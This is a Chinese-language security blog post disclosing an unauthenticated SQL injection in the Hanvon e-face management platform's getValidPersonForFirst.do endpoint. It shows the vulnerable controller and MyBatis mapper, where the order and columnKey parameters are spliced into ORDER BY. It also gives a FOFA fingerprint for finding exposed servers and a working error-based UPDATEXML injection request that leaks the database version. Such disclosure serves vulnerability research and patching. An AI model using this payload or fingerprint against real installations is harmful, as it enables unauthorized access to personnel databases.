---
title: "汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getvalidpersonforfirst.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/19 09:27
- 871浏览
- [0评论](#comment)
- 41分钟阅读

深入探索

数据库

软件

安全

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getValidPersonForFirst.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `FirstPeopleOpenController` 里关于 `getValidPersonForFirst` 的实现

```
@RequestMapping(
        value = {"getValidPersonForFirst.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getValidPersonForFirst(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) Long groupId, @RequestParam(value = "idsNotIn[]",required = false) Integer[] idsNotIn, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        EmployeeGroupParam employeeGroupParam = new EmployeeGroupParam();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != key) {
                employeeGroupParam.setKey(key);
            }

            if (null != departmentId) {
                employeeGroupParam.setDepartmentId(departmentId);
            }

            if (null != groupId) {
                employeeGroupParam.setGroupId(groupId);
            }

            PageHelper.startPage(page, pageSize);
            employeeGroupParam.setColumnKey(columnKey);
            employeeGroupParam.setOrder(order);
            List<EmployeeGroupEmployee> eges = this.firstPeopleOpenAsm.selectValidPerson(employeeGroupParam, idsNotIn);
            PageInfo<EmployeeGroupEmployee> info = new PageInfo(eges);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessFirstOpenDoorDao.xml

代码安全审计

```
<select id="selectValidPerson" resultType="com.hanvon.iface.tpm.access.EmployeeGroupEmployee">
    select EI.NG_ID id,EI.SZ_EMPLOY_ID AS attendanceCode,EI.SZ_NAME name,EI.NT_GENDER,EI.SZ_TELEPHONE phone, ED.NG_ID AS departmentId, ED.SZ_NAME AS departmentName
    from SYS_USER EI
    left join SYS_USER_BRANCH sub on EI.NG_ID = sub.NG_USER_ID
    left join SYS_BRANCH ED on ED.NG_ID=sub.NG_BRANCH_ID
    where EI.NT_USER_STATE = 1  AND
    EI.NG_ID not in (select EMPLOYEE_ID from ACCESS_FIRST_OPEN_EMPLOYEE AFOE WHERE AFOE.DOOR_ID = #{groupId})
    <if test="idsNotIn != null">
      AND EI.NG_ID not in
      <foreach close=")" collection="idsNotIn" index="index" item="item" open="(" separator=",">
        #{item}
      </foreach>
    </if>
    <if test="departmentId != null">
      AND ED.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    <if test="key != null and key != ''">
      and ( EI.SZ_NAME like concat("%", #{key},"%")
      or  EI.SZ_EMPLOY_ID like concat("%", #{key},"%") or  EI.SZ_TELEPHONE like concat("%", #{key},"%"))
    </if>
    order by
    <if test="order == null or order == ''">
      EI.SZ_EMPLOY_ID + 0 asc
    </if>
    <if test="order != null and order != ''">
      <if test="columnKey == 'attendanceCode' or columnKey == 'ATTENDANCE_CODE'">
        EI.SZ_EMPLOY_ID + 0 ${order}
      </if>
      <if test="columnKey != 'attendanceCode' and columnKey != 'ATTENDANCE_CODE'">
        ${columnKey} ${order}
      </if>
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/firstPeopleOpen/getValidPersonForFirst.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getValidPersonForFirst.do SQL注入漏洞](images/img-001-873086f088ed.webp)](https://image.mrxn.net/a300ea6842fe4419bb24117baa6700dd.webp)

成功利用报错注入获取到数据版本号

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALb0lEQVR4AeycgXLbug5Ec+7//3PfQzZHFiHSUtrb2DNXmaIr7C5AmpDqxJ3JPx8fH79+J35d/LJ3t5/xXT/Lq/+ZR/0Mq1fFylfaPvTJmf8O1kD+X3f/eZcT2Aby/+l+XIm+ceADHtF1e654SK26frHzMPrVC62B0QPJ1ctbscrhuR+iQ7B6zcL+Z7iv3QayJ+/r153AYSCQqcOIqy326UPqVn4Ydeth5OF5vupfvD3ruqLnxVXAuEZxV2LVb1ULWQdGnPkPA5mZbu7nTuBfGwhk+t49kNyXAmPeeevkRRjrug+iA5ZsqBf4fJ/bhK8L9a90g86bw/f6bA2/cfGvDeQba97WJyfw4wPxbnNP5jDeffIdYfTZpxCiwYilPQvXgNStvPrUey7/J/jjA/mTzf4Xag8DceodV4cBuav0f/qe/AXxd0uvh7nPOv0z1CPqgfTs+conD6mDEdXP0PU6zuoOA5mZbu7nTmAbCIzTh3l+tjVInXcDjHmvh+jykLzXq3eE+IEubZ88AJ/fZfWePT80aIT+Rn/2Bjq98cDT633hNpA9eV+/7gT+cerfxdWW7aPec3nIXaMO81z/Cq0v7B5Iz85fzSH11bvCurquMO9Y2u/G/YT003xxfjoQyF0Cc/ROgOj99UB4CKqv6uB7PogfHtjXMBdXa6uvELKGOox552Gud5954elAynTHz53AYSDwfKreXastwrx+VSe/QtdRX+XF6xFhvhcIr69qK2Dku24O8VVNxYovrQJGPyS3rjzGYSAKN77mBP6BTOvq8hD/bLpXe8x8kL4Q1ANbLvWJMOc/xa+/3KP4RW8A5z3KDPFBsLiK3tdcLE9Fz4tbxf2ErE7mRfz2cwiM03c/TrejOqROvfOrXL5j79Pzlb98kL10D4SHoHrV7ENehGt+GH3W2xvmur493k/I/jTe4Hp7D3GafU+Q6cKI3WduH3HFQ/p1HcJDUF3sfeUL1SC1ECytQl2EuV7eZwFjXffCXIfnPPBxPyEf7/W1DQQyvdXd47bVew6ph2DXzWHUYcz1iRAdgvIihAektk95+141AJ+fvqpDcgjqUxflO650SD/1jvbZ89tAFG987Qls32U5JZhP1W1C9FW+4iF1riN2v7yovkJ9hZA19ELy0ipgnusvT4W5CKkzF2HkYcz1dYT4ILjX7ydkfxpvcH0YSN0hFau9lVahXtcVqxxyF5SnApLrF0urMIfRV1qF+gxLr+gajL3Uy/vr16/tPQfigxH19TpzceWDsZ9+ER76YSCabnzNCXx7IJBpul2Y594ton4RUtd1GPmuWy8P8cMD9Yh6zSFe845nfkh999lnxa90/YXfHohNb/w7J7ANBDJ1l4Exr+ntA6LLWSdC9J53P8QHwa73enNRf6FcR0jvFQ/Rq0eFvrreB8SnDslhRHVx36OuIf66rtBXuA2kkjtefwKHgUCm17cG4SFYk63ovuIqOr/Ky1uhDukPQXkR5rx6IYye6j+L8lao1XUFjPUw5t3f8+pRAamDEUtbxWEgK+PN/8wJnA4EMl23490A4SEor0+E39PtB6m3X0eIDmw/T1grWgMPLzz88Jy3XoT4e3/1FXY/pA888HQgq+Y3/3dOYPn/IX2a5pBpmotuD0ZdvuPv1tkHxnWqH4SDOZZnHxDfnqtr1+hY2j4g9RBUA4ZPk+0D8ZmL1hXeT4in8ia4fdrrfmpKFTBOE5KXVqEfwkNQviNEh2DXq2dF53tenn1A+gGbVX0j2gXweQdLQ3IIyneE6BBUdz0YeRjz7rdOvvB+QuoU3ii29xD3BJnqbHrlgegQLO5Z2KcjXKu3t/WQOgiq7xFGrdeaW9PzFd995jCuZ33HK/77Cemn9uL88kCcbkf3L28uQu4eCMqLZ3XqMNbLz7D3htTqhTHvfnOIz/wM7d/xrG6vXx7Ivui+/nsnsA0ExrsBxtwtwJxXFyE+75arPIx1MOb2ESE6ILVEYPjuamWEuQ/C99fU+0B8ZzzEBw/cBtKL7/w1J3AP5DXnvlz1MJD94zirWumQx05dhDnfe+sX1XsuL6oXyokwX7u8FRD9zK8uwlgnL1bvCvMVlqdirx8Gshfv658/gW0gNakKmE8fwsOIfcvwXNcP8Zl3hOgQPNMhPmCz1uupkAA+39Qh2PnyVnTevLQK846QvjCivqqtMJ/hNpCZeHM/fwLLDxdrkvtwa3I973zXYbxruh+e671fz+23R5j33Hv21/aE1Kmd8fpE/eKKh6yjr/B+QuoU3ii2Dxch04IR3atThug9h/D6RRh569TFzkPqrvLVB1JT1xW9trh9QPwwonUQ3hp5cxHmPv0w6taJ+grvJ8RTeRM8vIes9gWZck2xYuUrrUK9rvchL0L6QnDvrWt9V7D8FZBeECyuApJf6fXMA9f6wOiDMa89VezXup+Q/Wm8wfX2HlKTmkXfI4xT7rq5vSB+CH586Bix+0f1kV3x6RGt7rm82PWe6xPh+WvSd9ZHX+H9hNQpvFFs7yGQaUPQPcKYr6a94u0jwrV+3Q+pg+BsPYjWa1e5/KyXWmHXzTuWtwKyD/XiKnoO8cED7yekTuqN4jCQPsW+V8g0z3iIz36idRB9lcv3OvkruKqF+doQHoKuAWMuL8JzXd8VPAzkStHt+XsncPguy6UgU+93Wc/1i5C6VS7f0b7iSu/8LIfsAUbU6xqivCgPqZcXITwEr/qt1z/D+wnxlN4EDwOBTH21P3iuO3XrzWGsW/Ew+iA5BHsdhAdcckO9HYHP/xfR2HV5Ud18hfpEGNeBMZ/1OQxkZrq5nzuB7eeQ1ZIwTtXp6+85jH4Yc/0Q3tx+HVe6vDhDe0HWMu8Iow7zHEbeNe0H0SGo3hGiwxHvJ8TTfBM8DMRprvYH41S772r9yicPWcf+8uYzhLEGklsLYz7rUZx+sbhnAfO+EN5aGHP5PR4Gshfv658/gcsD8W4R3Spk6vKQXF1UF+U7wlgPyWGOvX6fuxakdq/NrmH0wZjbz1qI3nl1eYhPXlTf4+WB2OTGv3sC20BgnOJ+anUN0SFY3D7cptwql4f06bn1orq44ktfaZ2HrA3Bqv03w/Ug/c1do+fyhdtAKrnj9SdwGAhkqhB0i05VhFGHMT/zdd3c9TqudMi6QC/5/GkcHnzvYd7x0OiLAD57fqXbLyqA8DCifSG8ufUiRAfuXxP78WZf26e9fV9n01SHTNd6SA7B7uu5dSKkDoLdD+H17xGiQdDavaeuOw/xl1YB5pUdo9cfHWHgeR+Ibr/Cwz9ZaXX//aoT2D7LqunsY7UhPWe6PhjvAuvUzWH0dX2Vy++x94T0XvHWwujTry7Kw+hX73jmVy+8n5A6hTeK7T0EMm24hv01eFfIQ/r0HEZevdfLw9zfdUDqgKveK94G6sDw3VXXzUWY+6/o9xPiKb0JbgPxbjjD1b5hflf0ftZD/OryIkQ3X6H1hd1TXAWkFwT1wZiXdx8w6pAcRrSfaA9zsfMw9gHun0M+3uxre0LcFxynBigv0ekDw7+3kByC+kQIDyMuF/oSYPTDI/+yfO4DMN1+spboe5AHPmvV5c07qkPqYMSum4v7foeBaLrxNSfwxwNxupC7wpch31EdRr+8fvMz1F+ot64rVrk8PN8DRK9eFb0O5np5K/TXdYV5Xe8D0ge430M+3uzrj5+Qq68HHncBPH5Fq/XeMRCfuQjhu9+8UG9dV/Qc0qPz5hC9aitWfGn7gNTp32uza4hfzbrCHxuIi9/4/AQOA6kpzeJ5m6MK412gw94w1/VBdAjKP6uHeCFoDczz3qvnMK+zr37z7yKM/av+MJAi73jdCWwDgUwLnuN3twrpt7qb5OGaz/WtM58hjD2tEWc1zzjrRL3mkPVWvD51EVIH3N9lfbzZ1/aEvNm+/rPb+R8AAAD//6ZuQYMAAAAGSURBVAMADT+MsDdoddUAAAAASUVORK5CYII=)

手机扫码阅读
